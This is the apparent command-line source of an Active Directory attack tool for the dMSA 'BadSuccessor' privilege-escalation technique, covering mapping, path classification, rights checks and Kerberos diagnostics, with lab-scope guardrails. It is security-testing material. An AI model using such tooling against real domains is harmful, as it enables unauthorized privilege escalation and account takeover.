from __future__ import annotations

import hashlib
import json
import shlex
import subprocess
from pathlib import Path
from typing import Any, Optional

import typer
from rich import print
from rich.panel import Panel
from rich.table import Table

from dmsa_reaper.auth.ldap_bind import LdapAuthConfig, bind
from dmsa_reaper.constants import DEFAULT_SD_FLAGS
from dmsa_reaper.map.runner import load_offline_fixture, run_live_map
from dmsa_reaper.models import CheckStatus, MapState, PathCandidate, TargetObject
from dmsa_reaper.ops.operation_log import configure_ops_dir, load_operation, save_operation
from dmsa_reaper.ops.external_proof import (
    ExternalProofError,
    BASE_PROOF_TYPE,
    find_secret_material,
    load_evidence_file,
    record_kerberos_base_check,
    record_external_verification,
    validate_kerberos_evidence,
)
from dmsa_reaper.ops.framework import (
    BADSUCCESSOR_PRIMITIVES,
    assess_badsuccessor,
    assess_ouroboros,
    build_badsuccessor_plan,
    build_operation_report,
    build_ouroboros_plan,
    build_ouroboros_simulation,
    classified_paths,
    is_sensitive_target,
    operation_lifecycle_summary,
    operation_report_markdown,
)
from dmsa_reaper.ops.kerberos_diagnostics import (
    inspect_dns_environment,
    inspect_kerberos_environment,
)
from dmsa_reaper.ops.rollback import rollback_operation
from dmsa_reaper.ops.verify import record_ldap_verification, verify_operation_ldap_details
from dmsa_reaper.output.console import print_paths
from dmsa_reaper.paths.classifier import classify_paths
from dmsa_reaper.paths.ranking import rank_paths
from dmsa_reaper.primitives.registry import get_primitives
from dmsa_reaper.utils import parse_int_auto

app = typer.Typer(no_args_is_help=True)
badsuccessor_app = typer.Typer(no_args_is_help=True)
ouroboros_app = typer.Typer(no_args_is_help=True)
app.add_typer(badsuccessor_app, name="badsuccessor")
app.add_typer(ouroboros_app, name="ouroboros")

# DACL primitives that require scope enforcement.
_DACL_PRIMITIVES = frozenset({"dacl-container-escalate", "dacl-target-escalate"})
_POSTPATCH_TARGET_ATTRS = frozenset({
    "msDS-SupersededManagedAccountLink",
    "msDS-SupersededServiceAccountState",
})
_POSTPATCH_TARGET_WRITERS = frozenset({
    "postpatch-mutual-pair",
    "existing-dmsa-postpatch-mutual",
})

# Rights that indicate CreateChild access on a container.
_CREATE_CHILD_RIGHTS = frozenset({"CreateChild", "CreateChild:dMSA", "GenericAll"})

# Rights that allow DACL or owner-based escalation on a container or target.
_DACL_CONTROL_RIGHTS = frozenset({"WriteDACL", "WriteOwner", "GenericAll"})

# Attribute-specific rights required for dMSA migration (both must be present
# unless GenericAll or GenericWrite is held instead).
_DMSA_MIGRATION_ATTR_RIGHTS = frozenset({
    "WriteProperty:msDS-ManagedAccountPrecededByLink",
    "WriteProperty:msDS-DelegatedMSAState",
})


def _write_json(path: Path, payload: object) -> None:
    path.write_text(json.dumps(payload, indent=2, default=str), encoding="utf-8")


def _has_dmsa_migration_rights(right_names: set[str]) -> bool:
    return (
        "GenericAll" in right_names
        or "GenericWrite" in right_names
        or _DMSA_MIGRATION_ATTR_RIGHTS.issubset(right_names)
    )


def _require_current_principal_sid(
    state: "MapState",
    allow_override: bool,
    override_flag: str,
) -> tuple[str | None, list[str]]:
    """Return (sid, warnings) for the current principal, or block if it is missing.

    When current_principal is present, returns (sid, []).
    When current_principal is absent and allow_override is True, returns
    (None, [warning]) — the caller must record the warning and skip the
    principal-filtered rights check.
    When current_principal is absent and allow_override is False, raises
    typer.BadParameter.
    """
    if state.current_principal is None or not state.current_principal.sid:
        if not allow_override:
            raise typer.BadParameter(
                "state.current_principal is missing — cannot verify rights for the current "
                "principal. Re-run map with authentication or pass "
                f"{override_flag} for an authorized lab override."
            )
        return None, [
            f"state.current_principal missing; rights not verified by principal "
            f"({override_flag} supplied)."
        ]
    return state.current_principal.sid, []


def _check_container_create_rights(
    state: "MapState | None",
    container_dn: str,
    allow_unmapped_container: bool,
) -> list[str]:
    """Validate CreateChild rights on container_dn from mapped state.

    Rights are filtered to the current principal's SID. Missing current_principal
    blocks execution unless allow_unmapped_container is True.
    Returns advisory warnings. Raises typer.BadParameter on hard blocks.
    """
    if state is None:
        if not allow_unmapped_container:
            raise typer.BadParameter(
                f"Cannot verify CreateChild rights on container {container_dn}: "
                "state.json is unavailable. "
                "Pass --allow-unmapped-container to override."
            )
        return [
            f"Container {container_dn!r}: state unavailable; CreateChild rights not verified "
            "(--allow-unmapped-container supplied)."
        ]

    container = next(
        (c for c in state.containers if c.dn.lower() == container_dn.lower()), None
    )
    if container is None:
        if not allow_unmapped_container:
            raise typer.BadParameter(
                f"Container {container_dn!r} is not in state.containers. "
                "Cannot confirm CreateChild rights from mapped state. "
                "Re-run map or pass --allow-unmapped-container to override."
            )
        return [
            f"Container {container_dn!r}: not in state.containers; CreateChild rights not verified "
            "(--allow-unmapped-container supplied)."
        ]

    principal_sid, principal_warnings = _require_current_principal_sid(
        state, allow_unmapped_container, "--allow-unmapped-container"
    )
    if principal_sid is None:
        return principal_warnings

    has_create_child = any(
        r.right in _CREATE_CHILD_RIGHTS and r.principal_sid == principal_sid
        for r in container.rights
    )
    if not has_create_child:
        if not allow_unmapped_container:
            raise typer.BadParameter(
                f"Container {container_dn!r} has no CreateChild rights for the current principal "
                "in the mapped state. "
                "Re-run map or pass --allow-unmapped-container to override."
            )
        return [
            f"Container {container_dn!r}: lacks CreateChild rights in mapped state; "
            "proceeding because --allow-unmapped-container was supplied."
        ]
    return []


def _validate_dmsa_migration_rights(
    state: "MapState | None",
    dmsa_dn: str,
    allow_unmapped_dmsa: bool,
) -> list[str]:
    """Validate dMSA migration rights from mapped state.

    Rights are filtered to the current principal's SID. Missing current_principal
    blocks execution unless allow_unmapped_dmsa is True.
    Returns advisory warnings. Raises typer.BadParameter on hard blocks.
    """
    if state is None:
        if not allow_unmapped_dmsa:
            raise typer.BadParameter(
                f"Cannot verify dMSA migration rights on {dmsa_dn!r}: "
                "state.json is unavailable. "
                "Pass --allow-unmapped-dmsa for an authorized lab override."
            )
        return [
            f"dMSA {dmsa_dn!r}: state unavailable; migration rights not verified "
            "(--allow-unmapped-dmsa supplied)."
        ]

    dmsa = next((d for d in state.dmsas if d.dn.lower() == dmsa_dn.lower()), None)
    if dmsa is None:
        if not allow_unmapped_dmsa:
            raise typer.BadParameter(
                f"dMSA {dmsa_dn!r} is not in state.dmsas. "
                "Cannot verify migration rights from mapped state. "
                "Re-run map or pass --allow-unmapped-dmsa for an authorized lab override."
            )
        return [
            f"dMSA {dmsa_dn!r}: not in state.dmsas; migration rights not verified "
            "(--allow-unmapped-dmsa supplied)."
        ]

    principal_sid, principal_warnings = _require_current_principal_sid(
        state, allow_unmapped_dmsa, "--allow-unmapped-dmsa"
    )
    if principal_sid is None:
        return principal_warnings

    right_names = {r.right for r in dmsa.rights if r.principal_sid == principal_sid}
    if not _has_dmsa_migration_rights(right_names):
        if not allow_unmapped_dmsa:
            raise typer.BadParameter(
                f"dMSA {dmsa_dn!r} is in state.dmsas but lacks migration rights "
                "for the current principal "
                "(requires GenericAll, GenericWrite, or both "
                "WriteProperty:msDS-ManagedAccountPrecededByLink and "
                "WriteProperty:msDS-DelegatedMSAState). "
                "Paths.json may be stale. Re-run map or pass --allow-unmapped-dmsa "
                "for an authorized lab override."
            )
        return [
            f"dMSA {dmsa_dn!r}: lacks migration rights for the current principal in mapped state; "
            "proceeding because --allow-unmapped-dmsa was supplied."
        ]
    return []


def _validate_container_dacl_control(
    state: "MapState | None",
    container_dn: str,
    allow_unmapped_container: bool,
) -> list[str]:
    """Validate WriteDACL/WriteOwner/GenericAll on container_dn from mapped state.

    Rights are filtered to the current principal's SID. Missing current_principal
    blocks execution unless allow_unmapped_container is True.
    Returns advisory warnings. Raises typer.BadParameter on hard blocks.
    """
    if state is None:
        if not allow_unmapped_container:
            raise typer.BadParameter(
                f"Cannot verify WriteDACL/WriteOwner rights on container {container_dn!r}: "
                "state.json is unavailable. "
                "Pass --allow-unmapped-container for an authorized lab override."
            )
        return [
            f"Container {container_dn!r}: state unavailable; DACL control rights not verified "
            "(--allow-unmapped-container supplied)."
        ]

    container = next((c for c in state.containers if c.dn.lower() == container_dn.lower()), None)
    if container is None:
        if not allow_unmapped_container:
            raise typer.BadParameter(
                f"Container {container_dn!r} is not in state.containers. "
                "dacl-container-escalate requires confirmed WriteDACL/WriteOwner rights. "
                "Re-run map or pass --allow-unmapped-container for an authorized lab override."
            )
        return [
            f"Container {container_dn!r}: not in state.containers; DACL control rights not verified "
            "(--allow-unmapped-container supplied)."
        ]

    principal_sid, principal_warnings = _require_current_principal_sid(
        state, allow_unmapped_container, "--allow-unmapped-container"
    )
    if principal_sid is None:
        return principal_warnings

    has_dacl_ctrl = any(
        r.right in _DACL_CONTROL_RIGHTS and r.principal_sid == principal_sid
        for r in container.rights
    )
    if not has_dacl_ctrl:
        if not allow_unmapped_container:
            raise typer.BadParameter(
                f"Container {container_dn!r} is in state.containers but lacks "
                "WriteDACL/WriteOwner/GenericAll for the current principal. "
                "Paths.json may be stale. Re-run map or pass --allow-unmapped-container "
                "for an authorized lab override."
            )
        return [
            f"Container {container_dn!r}: lacks DACL control rights in mapped state; "
            "proceeding because --allow-unmapped-container was supplied."
        ]
    return []


def _validate_target_dacl_control(
    state: "MapState | None",
    target_dn: str,
    allow_unmapped_target: bool,
) -> list[str]:
    """Validate WriteDACL/WriteOwner/GenericAll on target_dn from mapped state.

    Rights are filtered to the current principal's SID. Missing current_principal
    blocks execution unless allow_unmapped_target is True.
    Returns advisory warnings. Raises typer.BadParameter on hard blocks.
    """
    if state is None:
        if not allow_unmapped_target:
            raise typer.BadParameter(
                f"Cannot verify WriteDACL/WriteOwner rights on target {target_dn!r}: "
                "state.json is unavailable. "
                "Pass --allow-unmapped-target for an authorized lab override."
            )
        return [
            f"Target {target_dn!r}: state unavailable; DACL control rights not verified "
            "(--allow-unmapped-target supplied)."
        ]

    target = next((t for t in state.targets if t.dn.lower() == target_dn.lower()), None)
    if target is None:
        if not allow_unmapped_target:
            raise typer.BadParameter(
                f"Target {target_dn!r} is not in state.targets. "
                "dacl-target-escalate requires confirmed WriteDACL/WriteOwner rights on this target. "
                "Re-run map or pass --allow-unmapped-target for an authorized lab override."
            )
        return [
            f"Target {target_dn!r}: not in state.targets; DACL control rights not verified "
            "(--allow-unmapped-target supplied)."
        ]

    principal_sid, principal_warnings = _require_current_principal_sid(
        state, allow_unmapped_target, "--allow-unmapped-target"
    )
    if principal_sid is None:
        return principal_warnings

    right_names = {r.right for r in target.rights if r.principal_sid == principal_sid}
    if not right_names & _DACL_CONTROL_RIGHTS:
        if not allow_unmapped_target:
            raise typer.BadParameter(
                f"Target {target_dn!r} is in state.targets but lacks "
                "WriteDACL/WriteOwner/GenericAll for the current principal. "
                "Paths.json may be stale. Re-run map or pass --allow-unmapped-target "
                "for an authorized lab override."
            )
        return [
            f"Target {target_dn!r}: lacks DACL control rights in mapped state; "
            "proceeding because --allow-unmapped-target was supplied."
        ]
    return []


def _writes_postpatch_target_attrs(primitive_name: str, chain: str | None) -> bool:
    return primitive_name in _POSTPATCH_TARGET_WRITERS or (
        primitive_name == "dacl-container-escalate" and chain == "postpatch"
    )


def _find_target(state: MapState, dn: str) -> TargetObject | None:
    return next((t for t in state.targets if t.dn.lower() == dn.lower()), None)


def _validate_exact_postpatch_target(
    *,
    state: MapState | None,
    target_dn: str | None,
    primitive_name: str,
    chain: str | None,
    allow_unmapped_target: bool,
    confirm: bool,
) -> tuple[list[str], list[str] | None]:
    """Validate exact target-side WriteProperty proof for postpatch target writes.

    Returns (warnings, target_writable_attrs). When state is absent, dry-runs are
    allowed to proceed without enrichment; confirmed execution requires either a
    mapped target or --allow-unmapped-target.
    """
    if not _writes_postpatch_target_attrs(primitive_name, chain) or not target_dn:
        return [], None

    warning = (
        f"Target {target_dn!r} was not found in state.targets; proceeding because "
        "--allow-unmapped-target was supplied. Target-side WriteProperty was not proven."
    )

    if state is None:
        if confirm and not allow_unmapped_target:
            raise typer.BadParameter(
                f"Cannot validate target-side WriteProperty for {target_dn!r}: state is unavailable. "
                "Use a valid --state or pass --allow-unmapped-target for an authorized lab override."
            )
        return ([warning] if allow_unmapped_target else []), None

    target = _find_target(state, target_dn)
    if target is None:
        if allow_unmapped_target:
            return [warning], None
        raise typer.BadParameter(
            f"Target {target_dn!r} is not present in state.targets. "
            "Use --expand-targets / a fresh map, or pass --allow-unmapped-target for an authorized lab override."
        )

    writable = set(target.writable_attrs)
    if not _POSTPATCH_TARGET_ATTRS.issubset(writable):
        missing = sorted(_POSTPATCH_TARGET_ATTRS - writable)
        raise typer.BadParameter(
            f"Target {target_dn!r} is mapped but lacks required target-side WriteProperty: "
            f"{', '.join(missing)}"
        )
    return [], target.writable_attrs


def _external_output_metadata(
    *,
    mode: str,
    exit_code: int,
    stdout: str,
    stderr: str,
    argv: list[str] | None = None,
    command: str | None = None,
    store_output: bool = False,
) -> dict:
    if store_output:
        secret_findings = find_secret_material({"stdout": stdout, "stderr": stderr})
        if secret_findings:
            raise ValueError(
                "refusing to store secret-looking external output: "
                + "; ".join(secret_findings)
            )
    metadata = {
        "mode": mode,
        "exit_code": exit_code,
        "stdout_length": len(stdout.encode("utf-8")),
        "stderr_length": len(stderr.encode("utf-8")),
        "stdout_sha256": hashlib.sha256(stdout.encode("utf-8")).hexdigest(),
        "stderr_sha256": hashlib.sha256(stderr.encode("utf-8")).hexdigest(),
    }
    if argv is not None:
        metadata["argv"] = argv
    if command is not None:
        metadata["command"] = command
    if store_output:
        metadata["stdout"] = stdout
        metadata["stderr"] = stderr
    return metadata


def _classify_external_failure(stdout: str, stderr: str, *, dmsa: bool = False) -> str:
    text = f"{stdout}\n{stderr}".lower()
    if "krb_ap_err_skew" in text or "clock skew" in text:
        return "kerberos-clock-skew"
    if "dns" in text or "name or service not known" in text or "could not resolve" in text:
        return "kerberos-dns-resolution"
    if "krb5ccname" in text or "ccache" in text or "credential cache" in text:
        return "kerberos-cache-format"
    if dmsa and ("krb_err_generic" in text or "kdc_err" in text or "kerberos sessionerror" in text):
        return "kerberos-dmsa-proof-failed"
    return "kerberos-tooling-inconclusive"


def _adapter_template_from_file(path: Path) -> str:
    raw = json.loads(path.read_text(encoding="utf-8"))
    if not isinstance(raw, dict):
        raise typer.BadParameter("--adapter-command-file must contain a JSON object")
    if isinstance(raw.get("command"), str):
        return raw["command"]
    if isinstance(raw.get("argv"), list) and all(isinstance(item, str) for item in raw["argv"]):
        return shlex.join(raw["argv"])
    raise typer.BadParameter("--adapter-command-file must contain string 'command' or string-list 'argv'")


def _operation_target_sam(op) -> str:
    direct = op.metadata.get("target_sam")
    if direct:
        return str(direct).rstrip("$")
    target_dn = op.metadata.get("target_dn")
    if not target_dn:
        path = op.metadata.get("path")
        if isinstance(path, dict):
            direct = path.get("target_sam")
            if direct:
                return str(direct).rstrip("$")
            target_dn = path.get("target_dn")
    if target_dn:
        first = str(target_dn).split(",", 1)[0]
        if first.lower().startswith("cn="):
            return first[3:]
    return ""


def _render_adapter_command(template: str, op) -> str:
    target_dn = op.metadata.get("target_dn")
    path = op.metadata.get("path")
    if not target_dn and isinstance(path, dict):
        target_dn = path.get("target_dn")
    values = {
        "operation_id": op.id,
        "target_dn": target_dn or "",
        "target_sam": _operation_target_sam(op),
        "created_dmsa_dn": op.metadata.get("created_dmsa_dn", ""),
        "created_dmsa_sam": op.metadata.get("created_dmsa_sam", ""),
    }
    return template.format(**values)


def _load_paths_for_state(
    state_path: Path,
    paths_file: Path | None,
    *,
    expand_targets: bool,
    only: list[str] | None = None,
    exclude_legacy: bool = False,
    include_sensitive_targets: bool = False,
) -> tuple[MapState, list[PathCandidate]]:
    state = MapState.load(state_path)
    if paths_file:
        raw = json.loads(paths_file.read_text(encoding="utf-8"))
        paths = rank_paths([PathCandidate.model_validate(p) for p in raw])
        if only:
            wanted = set(only)
            if "badsuccessor" in wanted:
                wanted.remove("badsuccessor")
                wanted.update(BADSUCCESSOR_PRIMITIVES)
            if "ouroboros" in wanted:
                wanted.remove("ouroboros")
                wanted.update({
                    "postpatch-mutual-pair",
                    "existing-dmsa-postpatch-mutual",
                    "self-pkinit-loop",
                })
            paths = [path for path in paths if path.primitive in wanted]
        if exclude_legacy:
            paths = [
                path for path in paths
                if path.primitive not in {"legacy-oneway-link", "existing-dmsa-legacy-link"}
            ]
        if not include_sensitive_targets:
            paths = [path for path in paths if not is_sensitive_target(path.target_dn)]
        return state, paths
    return state, classified_paths(
        state,
        expand_targets=expand_targets,
        only=only,
        exclude_legacy=exclude_legacy,
        include_sensitive_targets=include_sensitive_targets,
    )


def _select_path(paths: list[PathCandidate], path_id: str) -> PathCandidate:
    selected = next((path for path in paths if path.id == path_id), None)
    if selected is None:
        raise typer.BadParameter(f"path not found: {path_id}")
    return selected


def _kerberos_ready_for_state(state: MapState) -> tuple[bool, list[str]]:
    dc_fqdn = None
    if state.environment.dcs:
        dc_fqdn = state.environment.dcs[0].get("dnsHostName")
    kerberos_diag = inspect_kerberos_environment(
        domain=state.environment.domain or "",
        dc_fqdn=dc_fqdn,
        run_cache_checks=True,
    )
    dns_diag = inspect_dns_environment(domain=state.environment.domain or "", dc_fqdn=dc_fqdn)
    notes = []
    if kerberos_diag.time_skew_ok is False:
        notes.append("Kerberos time skew is outside tolerance")
    if kerberos_diag.ccache_style in {"unset", "keyring"}:
        notes.append(f"KRB5CCNAME cache style is {kerberos_diag.ccache_style}")
    if dns_diag.srv_lookup_ok is False:
        notes.append("Kerberos DNS SRV lookup failed")
    return not notes, notes


def _require_kerberos_ready_if_requested(state: MapState, required: bool) -> None:
    if not required:
        return
    ready, notes = _kerberos_ready_for_state(state)
    if not ready:
        raise typer.BadParameter(
            "--require-kerberos-ready failed: " + "; ".join(notes)
        )


def _print_badsuccessor_table(assessment: dict[str, Any]) -> None:
    table = Table(title="BadSuccessor assessment")
    table.add_column("Path")
    table.add_column("Primitive")
    table.add_column("Status")
    table.add_column("Target")
    for path in assessment["paths"]:
        table.add_row(
            str(path["path_id"]),
            str(path["primitive"]),
            str(path["status"]),
            str(path.get("target_dn") or f"{path.get('candidate_targets_count', 0)} grouped targets"),
        )
    print(table)
    print("LDAP proof is not Kerberos proof; next required proof is kerberos-dmsa-proof.")


def _print_ouroboros_summary(assessment: dict[str, Any]) -> None:
    print(
        "ouroboros "
        f"status={assessment['ouroboros_status']} "
        f"capable={str(assessment['ouroboros_capable']).lower()} "
        f"paths={len(assessment['paths'])}"
    )
    for blocker in assessment["ouroboros_blockers"]:
        print(f"blocked: {blocker}")
    for warning in assessment["ouroboros_warnings"]:
        print(f"warning: {warning}")


# Shared LDAP option definitions reused across commands.
_OPT_DOMAIN = typer.Option(..., "--domain", "-d", help="Target domain FQDN.")
_OPT_DC_IP = typer.Option(None, "--dc-ip", help="DC IP address.")
_OPT_DC_HOST = typer.Option(None, "--dc-host", help="DC hostname.")
_OPT_USER = typer.Option(None, "--username", "-u", help="Bind username.")
_OPT_PASS = typer.Option(None, "--password", "-p", help="Bind password.")
_OPT_KRB = typer.Option(False, "--kerberos", "-k", help="Use ccache (Kerberos).")
_OPT_LDAPS = typer.Option(False, "--use-ldaps", help="Connect over LDAPS (port 636).")


def _make_ldap_config(
    domain: str,
    dc_ip: str | None,
    dc_host: str | None,
    username: str | None,
    password: str | None,
    kerberos: bool,
    use_ldaps: bool,
) -> LdapAuthConfig:
    return LdapAuthConfig(
        domain=domain,
        dc_ip=dc_ip,
        dc_host=dc_host,
        username=username,
        password=password,
        kerberos=kerberos,
        use_ldaps=use_ldaps,
    )


@app.command("map")
def map_cmd(
    domain: str = _OPT_DOMAIN,
    dc_ip: Optional[str] = _OPT_DC_IP,
    dc_host: Optional[str] = _OPT_DC_HOST,
    username: Optional[str] = _OPT_USER,
    password: Optional[str] = _OPT_PASS,
    kerberos: bool = _OPT_KRB,
    use_ldaps: bool = _OPT_LDAPS,
    sdflags: str = typer.Option(hex(DEFAULT_SD_FLAGS), "--sdflags"),
    try_sacl: bool = typer.Option(
        False,
        "--try-sacl",
        help="Try SACL retrieval in addition to owner+DACL; unreadable SACLs fall back.",
    ),
    target_filter: Optional[str] = typer.Option(None, "--target-filter", help="Extra LDAP filter for targets."),
    container_filter: Optional[str] = typer.Option(
        None,
        "--container-filter",
        help="Extra LDAP filter for containers.",
    ),
    max_targets: Optional[int] = typer.Option(None, "--max-targets", help="Limit target enumeration."),
    only_current_principal: bool = typer.Option(
        False,
        "--only-current-principal",
        help="Only enumerate a target object whose SID matches the current principal.",
    ),
    json_out: Path = typer.Option(Path("state.json"), "--json"),
    offline_fixture: Optional[Path] = typer.Option(None, "--offline-fixture"),
):
    """Map dMSA-relevant AD state and write JSON state."""
    if offline_fixture:
        state = load_offline_fixture(offline_fixture)
    else:
        if kerberos and not username:
            raise typer.BadParameter(
                "Kerberos mode requires --username for current principal SID/group expansion. "
                "Without it, effective-rights mapping would be incomplete."
            )
        cfg = _make_ldap_config(domain, dc_ip, dc_host, username, password, kerberos, use_ldaps)
        state = run_live_map(
            cfg,
            sdflags=parse_int_auto(sdflags),
            try_sacl=try_sacl,
            target_filter=target_filter,
            container_filter=container_filter,
            max_targets=max_targets,
            only_current_principal=only_current_principal,
        )

    state.save(json_out)
    print(f"[green]wrote map state[/green] {json_out}")
    print(f"dmsa_capable_status={state.environment.dmsa_capable_status}")


@app.command("paths")
def paths_cmd(
    state_path: Path = typer.Option(Path("state.json"), "--state"),
    json_out: Optional[Path] = typer.Option(None, "--json"),
    expand_targets: bool = typer.Option(
        False, "--expand-targets",
        help="Emit one row per (container, target) pair instead of grouping by container.",
    ),
    only: Optional[list[str]] = typer.Option(
        None,
        "--only",
        help="Only show the named primitive. May be passed multiple times.",
    ),
    exclude_legacy: bool = typer.Option(
        False,
        "--exclude-legacy",
        help="Hide lab/legacy primitives.",
    ),
    include_unreadable: bool = typer.Option(
        False,
        "--include-unreadable",
        help="Reserved for future unreadable-object path display; accepted for CLI stability.",
    ),
    include_sensitive_targets: bool = typer.Option(
        False,
        "--include-sensitive-targets",
        help="Reserved for explicit sensitive target inclusion; accepted for CLI stability.",
    ),
    require_kerberos_ready: bool = typer.Option(
        False,
        "--require-kerberos-ready",
        help="Block output if local Kerberos readiness checks are failing.",
    ),
):
    """Classify executable dMSA paths from map state."""
    state = MapState.load(state_path)
    _require_kerberos_ready_if_requested(state, require_kerberos_ready)
    paths = classified_paths(
        state,
        expand_targets=expand_targets,
        only=only,
        exclude_legacy=exclude_legacy,
        include_sensitive_targets=include_sensitive_targets,
    )
    _ = include_unreadable
    if json_out:
        json_out.write_text(
            "[" + ",".join(p.model_dump_json(indent=2) for p in paths) + "]",
            encoding="utf-8",
        )
        print(f"[green]wrote paths[/green] {json_out}")
    print_paths(paths)


@app.command("doctor")
def doctor_cmd(
    domain: str = _OPT_DOMAIN,
    dc_ip: Optional[str] = _OPT_DC_IP,
    dc_host: Optional[str] = _OPT_DC_HOST,
    username: Optional[str] = _OPT_USER,
    password: Optional[str] = _OPT_PASS,
    kerberos: bool = _OPT_KRB,
    use_ldaps: bool = _OPT_LDAPS,
    scope_file: Optional[Path] = typer.Option(None, "--scope", help="Optional scope file to validate."),
    ops_dir: Optional[Path] = typer.Option(None, "--ops-dir", help="Operation log directory to test."),
    json_out: Optional[Path] = typer.Option(None, "--json", help="Write doctor results as JSON."),
):
    """Check lab readiness and print actionable warnings."""
    checks: list[dict] = []

    def add_check(name: str, status: str, detail: str = "") -> None:
        checks.append({"name": name, "status": status, "detail": detail})

    configure_ops_dir(ops_dir)
    try:
        from dmsa_reaper.ops.operation_log import ensure_ops_dir
        directory = ensure_ops_dir(ops_dir)
        probe = directory / ".doctor-write-test"
        probe.write_text("ok", encoding="utf-8")
        probe.unlink()
        add_check("operation-log-directory", "pass", str(directory))
    except Exception as exc:
        add_check("operation-log-directory", "fail", str(exc))

    if scope_file:
        try:
            from dmsa_reaper.scope import load_scope
            scope, digest = load_scope(scope_file)
            add_check("scope-file", "pass", f"domain={scope.domain} sha256={digest}")
        except Exception as exc:
            add_check("scope-file", "fail", str(exc))

    conn = None
    root = None
    try:
        cfg = _make_ldap_config(domain, dc_ip, dc_host, username, password, kerberos, use_ldaps)
        conn = bind(cfg)
        add_check("ldap-bind", "pass", "bind succeeded")
    except Exception as exc:
        add_check("ldap-bind", "fail", str(exc))

    if conn is not None:
        try:
            from dmsa_reaper.ldap.rootdse import read_rootdse
            root = read_rootdse(conn)
            add_check("rootdse", "pass", json.dumps(root))
        except Exception as exc:
            add_check("rootdse", "fail", str(exc))

    schema_cache = None
    if conn is not None and root is not None:
        try:
            schema_nc = root.get("schemaNamingContext")
            config_nc = root.get("configurationNamingContext")
            if not schema_nc or not config_nc:
                raise RuntimeError("RootDSE missing schema/config naming context")
            from dmsa_reaper.schema.resolver import SchemaResolver
            schema_cache = SchemaResolver(conn, schema_nc, config_nc).resolve()
            add_check("schema-guid-resolution", "pass", "schema resolver completed")
            add_check(
                "dmsa-class-present",
                "pass" if schema_cache.dmsa_class_guid else "warning",
                schema_cache.dmsa_class_guid or "dMSA class GUID not resolved",
            )
        except Exception as exc:
            add_check("schema-guid-resolution", "fail", str(exc))

    if conn is not None and schema_cache is not None:
        try:
            from dmsa_reaper.map.environment import build_environment
            env = build_environment(conn, domain, schema_cache)
            add_check("kds-root-key", env.kds_root_key_status.value, "")
            add_check("server-2025-dc", env.server_2025_dc_status.value, "")
            add_check("dmsa-capable", env.dmsa_capable_status.value, "")
            add_check("ldap-signing-status", env.ldap_signing_status.value, "placeholder/detected if mapper supports it")
            add_check("ldaps-status", env.ldaps_status.value, "placeholder/detected if mapper supports it")
            add_check(
                "channel-binding-status",
                env.channel_binding_status.value,
                "placeholder/detected if mapper supports it",
            )
        except Exception as exc:
            add_check("environment", "fail", str(exc))

    dc_fqdn = None
    if isinstance(root, dict):
        dc_fqdn = root.get("dnsHostName") or dc_host
    else:
        dc_fqdn = dc_host

    kerberos_diag = inspect_kerberos_environment(
        domain=domain,
        dc_ip=dc_ip,
        dc_host=dc_host,
        dc_fqdn=dc_fqdn,
        run_cache_checks=kerberos,
    )
    dns_diag = inspect_dns_environment(domain=domain, dc_ip=dc_ip, dc_fqdn=dc_fqdn)
    if kerberos_diag.time_skew_ok is False:
        add_check(
            "kerberos-time-skew",
            "fail" if kerberos else "warning",
            f"skew_seconds={kerberos_diag.time_skew_seconds}",
        )
    if kerberos_diag.ccache_style != "unset":
        add_check("kerberos-ccache", "pass" if kerberos_diag.ccache_exists else "warning", kerberos_diag.ccache_style)
    else:
        add_check("kerberos-ccache", "warning", "KRB5CCNAME unset")
    if dns_diag.srv_lookup_ok is False:
        add_check(
            "dns-srv",
            "warning",
            f"{dns_diag.srv_record}; recommended_nameserver={dns_diag.recommended_nameserver}",
        )

    summary = {
        "ok": all(check["status"] not in {"fail", "error"} for check in checks),
        "checks": checks,
        "kerberos": kerberos_diag.to_json(),
        "dns": dns_diag.to_json(),
    }
    if json_out:
        json_out.write_text(json.dumps(summary, indent=2), encoding="utf-8")
        print(f"[green]wrote doctor JSON[/green] {json_out}")
    for check in checks:
        print(f"{check['name']}: {check['status']} {check['detail']}".rstrip())
    _print_kerberos_table(kerberos_diag.to_json(), dns_diag.to_json())


def _print_kerberos_table(kerberos: dict, dns: dict) -> None:
    table = Table(title="Kerberos readiness")
    table.add_column("Check")
    table.add_column("Value")
    table.add_column("Status")
    skew = kerberos.get("time_skew_seconds")
    skew_ok = kerberos.get("time_skew_ok")
    table.add_row(
        "DC time skew",
        "unknown" if skew is None else f"{skew}s",
        "unknown" if skew_ok is None else ("OK" if skew_ok else "WARNING"),
    )
    table.add_row("KRB5CCNAME", str(kerberos.get("krb5ccname") or "unset"), str(kerberos.get("ccache_style")))
    table.add_row("ccache exists", "yes" if kerberos.get("ccache_exists") else "no", "")
    table.add_row("TGT principal", str(kerberos.get("tgt_principal") or "not inspected"), "")
    cifs = kerberos.get("cifs_ticket")
    table.add_row("CIFS ticket", str(cifs or kerberos.get("cifs_ticket_present") or "not inspected"), "")
    table.add_row(
        "Impacket cache format",
        "; ".join(kerberos.get("imp_errata") or []) or "no notes",
        "OK" if kerberos.get("ccache_style") == "raw-file-path" else "CHECK",
    )
    table.add_row(
        "DNS SRV",
        str(dns.get("srv_record") or "unknown"),
        "OK" if dns.get("srv_lookup_ok") else "WARNING",
    )
    print(table)
    for warning in (kerberos.get("warnings") or []) + (dns.get("warnings") or []):
        print(f"[yellow]warning:[/yellow] {warning}")


@app.command("kerberos-doctor")
def kerberos_doctor_cmd(
    domain: str = _OPT_DOMAIN,
    dc_ip: Optional[str] = _OPT_DC_IP,
    dc_host: Optional[str] = _OPT_DC_HOST,
    json_out: Optional[Path] = typer.Option(None, "--json", help="Write Kerberos readiness JSON."),
):
    """Inspect Kerberos cache/config/DNS readiness without LDAP writes."""
    kerberos_diag = inspect_kerberos_environment(
        domain=domain,
        dc_ip=dc_ip,
        dc_host=dc_host,
        dc_fqdn=dc_host,
        run_cache_checks=True,
    )
    dns_diag = inspect_dns_environment(domain=domain, dc_ip=dc_ip, dc_fqdn=dc_host)
    summary = {
        "ok": (
            kerberos_diag.time_skew_ok is not False
            and kerberos_diag.ccache_style != "unset"
            and dns_diag.srv_lookup_ok is not False
        ),
        "kerberos": kerberos_diag.to_json(),
        "dns": dns_diag.to_json(),
    }
    if json_out:
        _write_json(json_out, summary)
        print(f"[green]wrote kerberos doctor JSON[/green] {json_out}")
    _print_kerberos_table(kerberos_diag.to_json(), dns_diag.to_json())


@app.command("lab-report")
def lab_report_cmd(
    state_path: Path = typer.Option(Path("state.json"), "--state"),
    paths_file: Optional[Path] = typer.Option(None, "--paths"),
    op_id: Optional[str] = typer.Option(None, "--op", help="Operation ID to include in lifecycle summary."),
    ops_dir: Optional[Path] = typer.Option(
        None,
        "--ops-dir",
